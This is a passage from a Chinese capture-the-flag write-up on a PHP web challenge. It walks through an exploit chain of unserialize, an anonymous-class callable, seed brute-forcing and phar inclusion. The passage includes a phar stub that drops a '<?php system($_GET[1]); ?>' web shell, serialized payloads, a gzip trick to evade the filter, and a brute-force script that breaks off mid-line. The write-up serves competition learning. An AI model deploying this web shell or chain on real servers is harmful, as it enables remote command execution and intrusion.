invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                        <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;class&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;func&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>] : <span class="string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析一下源代码</p>
<p>generateRandomString函数能生成随机8字节字母并返回</p>
<p>destruct魔术方法就不说了，能根据key的内容进行任意类实例化和任意方法调用</p>
<p>主要看construct中的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br></pre></td></tr></table></figure>

<p>将readflag赋值为一个匿名类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方手册看一下file全局变量的内容</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022141716443.png" alt="image-20251022141716443"></p>
<p>先是检测是否有文件上传，并且上传没有出错，设置time为当前时间并从全局变量中提取文件名进行拼接后作为随机数种子<code>$seed</code></p>
<p>删除uploads目录下的所有文件</p>
<p>利用generateRandomString函数随机生成一个8位纯字母字符串并结合时间戳生成新的jpg文件名，最后将文件的内容复制到新的文件中</p>
<p>可以看到这里的system是直接拼接的，那么可能是一个可利用的点？接着往下看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两层readflag函数，里面会获取上传的文件名并提取文件名，对文件名过滤了<code>://</code>，随后读取uploads下的同名文件的内容，并对内容进行了过滤<code>&lt;?</code>、<code>://</code>、<code>ph</code>、<code>?=</code>，最后进行include文件包含</p>
<p>先正常走一下phpinfo看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; key = <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; f = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BN%3Bs%3A1%3A%22f%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7D</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;N;s:1:&quot;f&quot;;s:7:&quot;phpinfo&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022140608965.png" alt="image-20251022140608965"></p>
<p>禁用了挺多函数的</p>
<p>然后我们现在的问题是如何调用到匿名类的readflag，因为序列化操作不能序列化匿名类，所以这也是我一直很疑惑的地方，测了几个小时都没测过去，也是赛后才复现的</p>
<p>get_class函数可以返回指定 <code>object</code> 的类名。</p>
<p>我们先来看一下匿名类的命名规则</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_class</span>(<span class="keyword">new</span> <span class="keyword">class</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/1.<span class="title">php</span>:2$10</span></span><br></pre></td></tr></table></figure>

<p>匿名类的命名规则：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>+函数+路径 : ⾏号$序号</span><br></pre></td></tr></table></figure>

<p>但是题目中是在eval函数里实现的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$b = new class&#123;&#125;;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">get_class</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/1.<span class="title">php</span>(2) : <span class="title">eval</span>()&#x27;<span class="title">d</span> <span class="title">code</span>:1$<span class="title">c5</span></span></span><br></pre></td></tr></table></figure>

<p>这里的行号就是<code>eval()&#39;d code+数字</code></p>
<p>因为eval函数是在第二行，所以括号里的行号是2，但是在eval中他是在一行，所以<code>$</code>前面的行号是1</p>
<p>然后我们推测一下题目中的匿名类的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>readflag/<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">1</span>) : <span class="keyword">eval</span>()\<span class="string">&#x27;d code:1$序号</span></span><br></pre></td></tr></table></figure>

<p>另外还有一个函数调用的姿势</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$func</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>

<p>在 PHP 中，形如 <code>[&#39;类名&#39;, &#39;方法名&#39;]</code> 或 <code>[$object, &#39;方法名&#39;]</code> 的数组都被视为 <strong>callable</strong>（可调用值）。当把这样的数组放进变量并使用函数调用语法 <code>($var)()</code> 时，PHP 会把该变量当作回调来执行，等价于 <code>call_user_func($var)</code>。</p>
<p>因此我们能得出调用readflag的方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个test类</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; f = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; key = <span class="string">&#x27;class&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用readflag函数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; f = <span class="keyword">array</span>(<span class="string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d</span></span><br><span class="line"><span class="string">code:1<span class="subst">$1</span>&quot;</span>, <span class="string">&#x27;readflag&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> -&gt; key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<p>接下来就是上传文件的问题了</p>
<p>参考苟哥的文章：<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/</a></p>
<p>利用phar文件去进行文件包含，但是需要绕过验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">system(&#x27;echo &quot;&lt;?php system(\$_GET[1]); ?&gt;&quot; &gt; 1.php&#x27;);</span></span><br><span class="line"><span class="string">__HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用gzip去压缩绕过waf检测，这个刚好前几天做的0xgame2025中的题中有绕过姿势</p>
<p>然后我们需要知道怎么把这个phar文件搞进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里filename可控，并且这个种子是可以爆破的，那么就可以试着让<code>$randomStr</code>生成的文件名是以phar开头，写个脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前时间time为：&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$found</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$max</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$max</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="variable">$i</span>;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>((<span class="keyword">int</span>)<span class="variable">$seed</span>);</span><br><span class="line">    <span class="comment">//由于是自定义的generateRandomString且内部用的rand，所以需要用srand</span></span><br><span class="line">    <span class="title function_ invoke__">srand</span>((<span class="keyword">int</span>)<span class="variable">$seed</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$randomStr</span>,<span class="number">0</span>,<span class="number">4</span>) === <span class="string">&#x27;phar&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$found</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;找到合适的字符串！\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;生成的字符串为：&quot;</span> . <span class="variable">$randomStr</span> . <span 